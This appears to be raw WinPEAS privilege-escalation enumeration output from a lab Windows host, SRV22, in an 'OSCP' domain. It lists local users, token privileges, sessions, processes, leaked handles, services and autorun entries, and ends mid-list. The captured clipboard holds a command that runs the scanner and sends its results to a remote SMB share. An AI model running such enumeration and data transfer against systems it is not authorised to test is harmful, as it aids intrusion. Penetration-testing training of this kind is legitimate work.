net localgroup`, but that won't accept user/group names longer than 24 characters.  This means you have to use the .NET Directory Services APIs.  How do you reliably add both users *and* groups?  What if those users are in a domain?  What if they're in another domain?  What about built-in users?  Fortunately, you're brain hasn't exploded.
So, this function adds users and groups to a *local* group.
If the members are already part of the group, nothing happens.
The user running this function must have access to the directory where each principal in the `Member` parameter and the directory where each of the group's current members are located.
   Created At      :        10/9/2024 1:55:57 PM
   Command line    :        net localgroup`, but that won't accept user/group names longer than 24 characters.  This means you have to use the .NET Directory Services APIs.  How do you reliably add both users *and* groups?  What if those users are in a domain?  What if they're in another domain?  What about built-in users?  Fortunately, you're brain hasn't exploded.


   =================================================================================================


╔══════════╣ Displaying Power off/on events for last 5 days



════════════════════════════════════╣ Users Information ╠════════════════════════════════════

╔══════════╣ Users
╚ Check if you have some admin equivalent privileges https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users--groups
  Current user: b.martin
  Current groups: Domain Users, Everyone, Builtin\Remote Desktop Users, Users, Remote Interactive Logon, Interactive, Authenticated Users, This Organization, Local, Travel Agents, Authentication authority asserted identity
   =================================================================================================

    SRV22\Administrator: Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-Req

    SRV22\DefaultAccount(Disabled): A user account managed by the system.
        |->Groups: System Managed Accounts Group
        |->Password: CanChange-NotExpi-NotReq

    SRV22\Guest(Disabled): Built-in account for guest access to the computer/domain
        |->Groups: Guests
        |->Password: NotChange-NotExpi-NotReq

    SRV22\jenkins
        |->Groups: Users
        |->Password: CanChange-NotExpi-Req

    SRV22\WDAGUtilityAccount(Disabled): A user account managed and used by the system for Windows Defender Application Guard scenarios.
        |->Password: CanChange-NotExpi-Req


╔══════════╣ Current User Idle Time
   Current User   :     OSCP\b.martin
   Idle Time      :     00h:00m:03s:031ms

╔══════════╣ Display Tenant information (DsRegCmd.exe /status)
   Tenant is NOT Azure AD Joined.

╔══════════╣ Current Token privileges
╚ Check if you can escalate privilege using some enabled token https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED

╔══════════╣ Clipboard text
.\winPEASx64.exe | Tee-Object -FilePath \\172.16.104.206\Transfer\peas_result.txt

╔══════════╣ Logged users
    NT SERVICE\MSSQLSERVER
    NT SERVICE\SQLSERVERAGENT
    NT SERVICE\SQLTELEMETRY
    SRV22\jenkins
    OSCP\b.martin

╔══════════╣ Display information about local users
   Computer Name           :   SRV22
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   2/22/2026 5:30:11 AM
   Logons Count            :   33
   Password Last Set       :   10/9/2024 10:39:03 AM

   =================================================================================================

   Computer Name           :   SRV22
   User Name               :   DefaultAccount
   User Id                 :   503
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed by the system.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   SRV22
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   SRV22
   User Name               :   jenkins
   User Id                 :   1001
   Is Enabled              :   True
   User Type               :   User
   Comment                 :   
   Last Logon              :   11/11/2024 10:28:34 AM
   Logons Count            :   9
   Password Last Set       :   10/9/2024 12:54:28 PM

   =================================================================================================

   Computer Name           :   SRV22
   User Name               :   WDAGUtilityAccount
   User Id                 :   504
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed and used by the system for Windows Defender Application Guard scenarios.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   10/9/2024 2:16:19 PM

   =================================================================================================


╔══════════╣ RDP Sessions
    SessID    pSessionName   pUserName      pDomainName              State     SourceIP
    2         RDP-Tcp#2      b.martin       OSCP                     Active    192.168.238.128

╔══════════╣ Ever logged users
    NT SERVICE\MSSQLSERVER
    NT SERVICE\SQLSERVERAGENT
    NT SERVICE\SQLTELEMETRY
    SRV22\Administrator
    SRV22\jenkins
    OSCP\b.martin

╔══════════╣ Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\b.martin : b.martin [Allow: AllAccess]
    C:\Users\Default
    C:\Users\Default User
    C:\Users\jenkins
    C:\Users\Public : Interactive [Allow: WriteData/CreateFiles]

╔══════════╣ Looking for AutoLogon credentials
    Not Found

╔══════════╣ Password Policies
╚ Check for a possible brute-force 
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================

    Domain: SRV22
    SID: S-1-5-21-318536300-2164503644-2098472648
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 1.00:00:00
    MinPasswordLength: 7
    PasswordHistoryLength: 24
    PasswordProperties: 0
   =================================================================================================


╔══════════╣ Print Logon Sessions
    Method:                       WMI
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     1179383
    Logon Time:                   
    Logon Type:                   0
    Start Time:                   12/31/1600 4:00:00 PM
    Domain:                       OSCP
    Authentication Package:       
    Start Time:                   12/31/1600 4:00:00 PM
    User Name:                    b.martin
    User Principal Name:          
    User SID:                     

   =================================================================================================

    Method:                       WMI
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     2003360
    Logon Time:                   
    Logon Type:                   Network
    Start Time:                   2/22/2026 5:43:39 AM
    Domain:                       OSCP
    Authentication Package:       NTLM
    Start Time:                   2/22/2026 5:43:39 AM
    User Name:                    b.martin
    User Principal Name:          
    User SID:                     

   =================================================================================================



════════════════════════════════════╣ Processes Information ╠════════════════════════════════════

╔══════════╣ Interesting Processes -non Microsoft-
╚ Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#running-processes
    conhost(5300)[C:\Windows\system32\conhost.exe] -- POwn: b.martin
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    svchost(5084)[C:\Windows\system32\svchost.exe] -- POwn: b.martin
    Command Line: C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc
   =================================================================================================

    RuntimeBroker(1896)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: b.martin
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    sihost(1368)[C:\Windows\system32\sihost.exe] -- POwn: b.martin
    Command Line: sihost.exe
   =================================================================================================

    svchost(7000)[C:\Windows\System32\svchost.exe] -- POwn: b.martin
    Command Line: C:\Windows\System32\svchost.exe -k UnistackSvcGroup
   =================================================================================================

    SearchUI(6312)[C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe] -- POwn: b.martin
    Command Line: "C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca
   =================================================================================================

    taskhostw(2876)[C:\Windows\system32\taskhostw.exe] -- POwn: b.martin
    Command Line: taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
   =================================================================================================

    powershell(5244)[C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe] -- POwn: b.martin
    Command Line: "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" 
   =================================================================================================

    RuntimeBroker(6412)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: b.martin
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    ShellExperienceHost(6212)[C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe] -- POwn: b.martin
    Command Line: "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca
   =================================================================================================

    RuntimeBroker(6320)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: b.martin
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    rdpclip(1628)[C:\Windows\System32\rdpclip.exe] -- POwn: b.martin
    Command Line: rdpclip
   =================================================================================================

    notepad(3004)[C:\Windows\system32\notepad.exe] -- POwn: b.martin
    Command Line: "C:\Windows\system32\notepad.exe" 
   =================================================================================================

    explorer(5552)[C:\Windows\Explorer.EXE] -- POwn: b.martin
    Command Line: C:\Windows\Explorer.EXE
   =================================================================================================

    svchost(2180)[C:\Windows\system32\svchost.exe] -- POwn: b.martin
    Command Line: C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService
   =================================================================================================

    notepad(3768)[C:\Windows\system32\notepad.exe] -- POwn: b.martin
    Command Line: "C:\Windows\system32\notepad.exe" 
   =================================================================================================

    ImeBroker(6944)[C:\Windows\System32\IME\SHARED\imebroker.exe] -- POwn: b.martin
    Command Line: C:\Windows\System32\IME\SHARED\imebroker.exe -Embedding
   =================================================================================================

    WinPEASx64(6872)[C:\Users\b.martin\WinPEASx64.exe] -- POwn: b.martin -- isDotNet
    Permissions: b.martin [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Users\b.martin (b.martin [Allow: AllAccess])
    Command Line: "C:\Users\b.martin\WinPEASx64.exe"
   =================================================================================================


╔══════════╣ Vulnerable Leaked Handlers
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#leaked-handlers
╚ Getting Leaked Handlers, it might take some time...
[#######---]  76% |#--]  85% /#-]  90% -7% \                       Handle: 2204(key)
    Handle Owner: Pid is 6872(WinPEASx64) with owner: b.martin
    Reason: TakeOwnership
    Registry: HKLM\software\microsoft\fusion\publisherpolicy\default
   =================================================================================================

    Handle: 2444(key)
    Handle Owner: Pid is 6872(WinPEASx64) with owner: b.martin
    Reason: TakeOwnership
    Registry: HKLM\software\microsoft\internet explorer\main\featurecontrol
   =================================================================================================

    Handle: 2536(key)
    Handle Owner: Pid is 6872(WinPEASx64) with owner: b.martin
    Reason: AllAccess
    Registry: HKLM\software\policies\microsoft\windows\currentversion\internet settings
   =================================================================================================



════════════════════════════════════╣ Services Information ╠════════════════════════════════════

╔══════════╣ Interesting Services -non Microsoft-
╚ Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
    Jenkins(Jenkins)["C:\Program Files\Jenkins\jenkins.exe"] - Auto - Running
    Jenkins Automation Server
   =================================================================================================

    Sense(Sense)["C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"] - Manual - Stopped
   =================================================================================================

    ssh-agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
    Agent to hold private keys used for public key authentication.
   =================================================================================================

    VGAuthService(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Auto - Running
    Alias Manager and Ticket Service
   =================================================================================================

    VM3DService(VMware, Inc. - VMware SVGA Helper Service)[C:\Windows\system32\vm3dservice.exe] - Auto - Running
    Helps VMware SVGA driver by collecting and conveying user mode information
   =================================================================================================

    VMTools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Auto - Running
    Provides support for synchronizing objects between the host and guest operating systems.
   =================================================================================================


╔══════════╣ Modifiable Services
╚ Check if you can modify any service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    RmSvc: GenericExecute (Start/Stop)
    ConsentUxUserSvc_13ac89: GenericExecute (Start/Stop)
    DevicePickerUserSvc_13ac89: GenericExecute (Start/Stop)
    DevicesFlowUserSvc_13ac89: GenericExecute (Start/Stop)
    PimIndexMaintenanceSvc_13ac89: GenericExecute (Start/Stop)
    PrintWorkflowUserSvc_13ac89: GenericExecute (Start/Stop)
    UnistoreSvc_13ac89: GenericExecute (Start/Stop)
    UserDataSvc_13ac89: GenericExecute (Start/Stop)
    WpnUserService_13ac89: GenericExecute (Start/Stop)

╔══════════╣ Looking if you can modify any service registry
╚ Check if you can modify the registry of a service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services-registry-modify-permissions
    [-] Looks like you cannot change the registry of any service...

╔══════════╣ Checking write permissions in PATH folders (DLL Hijacking)
╚ Check for DLL Hijacking in PATH folders https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dll-hijacking
    C:\Program Files\Common Files\Oracle\Java\javapath
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\
    C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\
    C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\
    C:\Program Files\Microsoft SQL Server\150\Tools\Binn\
    C:\Program Files\Microsoft SQL Server\150\DTS\Binn\


════════════════════════════════════╣ Applications Information ╠════════════════════════════════════

╔══════════╣ Current Active Window Application
    Windows PowerShell

╔══════════╣ Installed Applications --Via Program Files/Uninstall registry--
╚ Check if you can modify installed software https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#applications
    C:\Program Files\Common Files
    C:\Program Files\desktop.ini
    C:\Program Files\internet explorer
    C:\Program Files\Java
    C:\Program Files\Jenkins
    C:\Program Files\Microsoft
    C:\Program Files\Microsoft SQL Server
    C:\Program Files\Microsoft Visual Studio 10.0
    C:\Program Files\Microsoft.NET
    C:\Program Files\msedge_installer.log
    C:\Program Files\MsEdgeCrashpad
    C:\Program Files\PackageManagement
    C:\Program Files\Uninstall Information
    C:\Program Files\VMware
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Mail
    C:\Program Files\Windows Media Player
    C:\Program Files\Windows Multimedia Platform
    C:\Program Files\windows nt
    C:\Program Files\Windows Photo Viewer
    C:\Program Files\Windows Portable Devices
    C:\Program Files\Windows Security
    C:\Program Files\Windows Sidebar
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell


╔══════════╣ Autorun Applications
╚ Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html

    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: VMware User Process
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Userinit
    Folder: C:\Windows\system32
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================


    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\System32
    File: C:\Windows\System32\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.cvid
    Folder: None (PATH Injection)
    File: iccvid.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
    Folder: C:\Program Files\Internet Explorer
    File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wow64cpu
    Folder: None (PATH Injection)
    File: wow64cpu.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wowarmhw
    Folder: None (PATH Injection)
    File: wowarmhw.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _xtajit
    Folder: None (PATH Injection)
    File: xtajit.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: advapi32
    Folder: None (PATH Injection)
    File: advapi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: clbcatq
    Folder: None (PATH Injection)
    File: clbcatq.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: combase
    Folder: None (PATH Injection)
    File: combase.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: COMDLG32
    Folder: None (PATH Injection)
    File: COMDLG32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: coml2
    Folder: None (PATH Injection)
    File: coml2.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DifxApi
    Folder: None (PATH Injection)
    File: difxapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdi32
    Folder: None (PATH Injection)
    File: gdi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdiplus
    Folder: None (PATH Injection)
    File: gdiplus.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMAGEHLP
    Folder: None (PATH Injection)
    File: IMAGEHLP.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMM32
    Folder: None (PATH Injection)
    File: IMM32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: kernel32
    Folder: None (PATH Injection)
    File: kernel32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSCTF
    Folder: None (PATH Injection)
    File: MSCTF.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSVCRT
    Folder: None (PATH Injection)
    File: MSVCRT.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NORMALIZ
    Folder: None (PATH Injection)
    File: NORMALIZ.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NSI
    Folder: None (PATH Injection)
    File: NSI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: ole32
    Folder: None (PATH Injection)
    File: ole32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: OLEAUT32
    Folder: None (PATH Injection)
    File: OLEAUT32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: PSAPI
    Folder: None (PATH Injection)
    File: PSAPI.DLL
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: rpcrt4
    Folder: None (PATH Injection)
    File: rpcrt4.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: sechost
    Folder: None (PATH Injection)
    File: sechost.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: Setupapi
    Folder: None (PATH Injection)
    File: Setupapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHCORE
    Folder: None (PATH Injection)
    File: SHCORE.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHELL32
    Folder: None (PATH Injection)
    File: SHELL32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHLWAPI
    Folder: None (PATH Injection)
    File: SHLWAPI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: user32
    Folder: None (PATH Injection)
    File: user32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WLDAP32
    Folder: None (PATH Injection)
    File: WLDAP32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64
    Folder: None (PATH Injection)
    File: wow64.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64win
    Folder: None (PATH Injection)
    File: wow64win.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WS2_32
    Folder: None (PATH Injection)
    File: WS2_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
    Key: StubPath
    Folder: \
    FolderPerms: Users [Allow: AppendData/CreateDirectories]
    File: /UserInstall
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\ie4uinit.exe -UserConfig
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenAdmin
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenUser
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
